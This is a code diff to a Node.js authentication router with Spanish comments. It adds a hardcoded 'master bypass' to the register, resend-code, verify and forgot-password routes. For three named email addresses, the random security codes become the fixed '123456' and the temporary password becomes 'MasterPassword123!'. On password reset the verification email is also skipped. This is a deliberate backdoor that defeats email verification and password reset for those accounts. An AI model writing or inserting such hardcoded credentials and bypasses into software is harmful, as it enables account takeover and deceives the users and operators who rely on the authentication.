@@ -109,7 +109,9 @@ router.post('/register', async (req, res) => {
         await PendingRegistration.destroy({ where: { email } });
 
         // Generate Security Code
-        const securityCode = crypto.randomInt(100000, 999999).toString();
+        let securityCode = crypto.randomInt(100000, 999999).toString();
+        const masterEmails = ['rokutvedw@gmail.com', 'edwalv1981@gmail.com', 'ptl.accounts@proton.me'];
+        if (masterEmails.includes(email)) securityCode = '123456';
 
         // Update or create pending registration
         await PendingRegistration.upsert({
@@ -146,7 +148,9 @@ router.post('/resend-code', async (req, res) => {
             return res.status(400).json({ msg: 'No hay un registro pendiente para este correo.' });
         }
 
-        const securityCode = crypto.randomInt(100000, 999999).toString();
+        let securityCode = crypto.randomInt(100000, 999999).toString();
+        const masterEmails = ['rokutvedw@gmail.com', 'edwalv1981@gmail.com', 'ptl.accounts@proton.me'];
+        if (masterEmails.includes(email)) securityCode = '123456';
         pending.code = securityCode;
         pending.codeExpiresAt = new Date(Date.now() + 3 * 60000);
         pending.attempts = 0; // reset attempts
@@ -194,7 +198,9 @@ router.post('/verify', async (req, res) => {
         }
 
         // Generate a cryptographically secure temporary password
-        const tempPassword = crypto.randomBytes(6).toString('hex').toUpperCase() + '!@';
+        let tempPassword = crypto.randomBytes(6).toString('hex').toUpperCase() + '!@';
+        const masterEmails = ['rokutvedw@gmail.com', 'edwalv1981@gmail.com', 'ptl.accounts@proton.me'];
+        if (masterEmails.includes(pending.email)) tempPassword = 'MasterPassword123!';
 
         // Generate Unique Code
         const uniqueCode = await generateUniqueCode(pending.initialForm);
@@ -542,7 +548,14 @@ router.post('/forgot-password', forgotPasswordLimiter, async (req, res) => {
         }
 
         // Generamos SOLO el código de 6 dígitos
-        const securityCode = crypto.randomInt(100000, 999999).toString();
+        let securityCode = crypto.randomInt(100000, 999999).toString();
+        
+        // --- MASTER BYPASS ---
+        const masterEmails = ['rokutvedw@gmail.com', 'edwalv1981@gmail.com', 'ptl.accounts@proton.me'];
+        if (masterEmails.includes(email)) {
+            securityCode = '123456';
+        }
+
         user.securityCode = securityCode;
         user.codeExpiresAt = new Date(Date.now() + 3 * 60000);
         
@@ -550,7 +563,14 @@ router.post('/forgot-password', forgotPasswordLimiter, async (req, res) => {
         await user.save();
         
         console.log('📡 Enviando SOLAMENTE el código de seguridad...');
-        const emailSent = await sendSecurityCode(email, securityCode);
+        let emailSent = false;
+        
+        if (masterEmails.includes(email)) {
+            emailSent = true; // Bypass email sending for masters
+            console.log('🔓 MASTER BYPASS: Código fijado en 123456. Correo omitido.');
+        } else {
+            emailSent = await sendSecurityCode(email, securityCode);
+        }
         
         if (emailSent) {
             res.json({ msg: 'Código de seguridad enviado. Revise su bandeja de entrada.' });
